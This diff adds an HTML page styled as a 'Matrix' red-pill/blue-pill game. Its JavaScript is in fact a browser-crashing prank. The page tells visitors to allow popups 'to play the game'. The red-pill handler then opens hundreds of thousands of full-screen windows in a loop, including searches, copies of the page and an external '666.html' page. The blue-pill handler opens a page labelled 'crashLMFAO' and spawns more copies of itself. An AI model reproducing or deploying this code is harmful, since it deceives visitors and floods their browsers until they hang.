@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href='https://fonts.googleapis.com/css?family=Astloch' rel='stylesheet'>
+        <title>Matrix</title>
+        <style>
+        body {
+            background: #293437;
+            margin-left: 30%;
+            margin-right: 30%;
+            margin-top: 5%;
+            margin-bottom: 5%;
+            font-family: 'Astloch';
+        }
+        .buttonred {
+            background: #C21D44;
+            font-family: 'Astloch', sans-serif;
+            width: 13%;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-left: auto;
+            margin-right: auto;
+            color: #C21D44;
+            border: 3px solid #C21D44;
+            display: block;
+            align-items: center;
+            transition: 0.3s ease-in-out;
+            border-radius: 20px;
+            font-size: 20px;
+        }
+        .buttonblue {
+            background: #256498;
+            font-family: 'Astloch', sans-serif;
+            width: 13%;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-left: auto;
+            margin-right: auto;
+            color: #256498;
+            border: 3px solid #256498;
+            display: block;
+            align-items: center;
+            transition: 0.3s ease-in-out;
+            border-radius: 20px;
+            font-size: 20px;
+        }
+        .buttonred:hover {
+            animation: fly 1s;
+            transition: 0.3s ease-in-out;
+        }
+        .buttonblue:hover {
+            animation: fly 1s;
+            transition: 0.3s ease-in-out;
+        }
+        .text {
+            color: #93E5BE;
+            font-family: 'Astloch', sans-serif;
+            font-size: 40px;
+            transition: 0.5s ease;
+            text-align: center;
+        }
+        .text2 {
+            color: #93E5BE;
+            font-family: 'Astloch', sans-serif;
+            font-size: 20px;
+            transition: 0.5s ease;
+            text-align: center;
+        }
+        div {
+            background: #182225;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        @keyframes fly {
+            0% { transform: translate(0px,0px) rotate(0deg); }
+            25% { transform: translate(0px,0px) rotate(20deg); }
+            50% { transform: translate(0px,0px) rotate(-20deg); }
+            75% { transform: translate(0px 0px) rotate(0deg); }
+            100% { transform: translate(0px,0px) rotate(0deg); }
+        }
+        @keyframes down {
+            0% { transform: translate(0px,0px) rotate(0deg); }
+            25% { transform: translate(0px,0px) rotate(0deg); }
+            50% { transform: translate(0px,0px) rotate(0deg); }
+            75% { transform: translate(0px 0px) rotate(0deg); }
+            100% { transform: translate(0px,0px) rotate(0deg); }
+        }
+        @media only screen and (max-width: 768px) {
+            body {
+                margin-left: 5%;
+            margin-right: 5%;
+            }
+        }
+        </style>
+    </head>
+    <body>
+        <div>
+            <h1 class="text">Matrix.</h1>
+            <button class="buttonred" onclick="javascript:redPill()">|</button>
+            <br>
+            <button class="buttonblue" onclick="javascript:bluePill()">|</button>
+            <h2 class="text2">Choose a button.</h2>
+        </div>
+        <script>
+        var url = window.location.pathname;
+        function getRandomInt(min, max) {
+            min = Math.ceil(min);
+            max = Math.floor(max);
+            return Math.floor(Math.random() * (max - min) + min);
+        }
+        var randomNumber = getRandomInt(0,9);
+        function redPill() {
+            if (confirm("Are you sure?")) {
+                window.alert("Please allow popups on this website to play the game!")
+                var fakeWindow = window.open("",);
+                for (let i=0; i<694200; i++) {
+                    var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
+                    var smallWindow = window.open(url, "", "width=1920,height=1080");
+                    var randomNumber = getRandomInt(0,9);
+                    var randomLink = 'https://www.google.com/search?q=' + randomNumber
+                    var openMass = window.open("https://182exe.github.io/matrix/666.html", "", "1920px", "1080px");
+                    for (let i=0; i<5; i++) {
+                        var randomLink = randomLink + randomNumber
+                        var randomNumber = getRandomInt(100,999);
+                    }
+                    var randomLink = 'https://www.google.com/search?q='
+                }
+            } else {
+                window.alert("All right. Try again when you're ready.")
+            }
+        }
+        function bluePill() {
+            if (confirm("Are you sure?")) {
+                var crashLMFAO = window.open("https://182exe.github.io/jam/", "")
+                window.alert("Please allow popups on this website to play the game!")
+                for (let i=0; i<5; i++) {
+                    var smallWindow = window.open(url, "", "width=1920,height=1080");
+                }
+            } else {
+                window.alert("All right. Try again when you're ready.")
+            }
+        }
+        </script>
+    </body>
+</html>
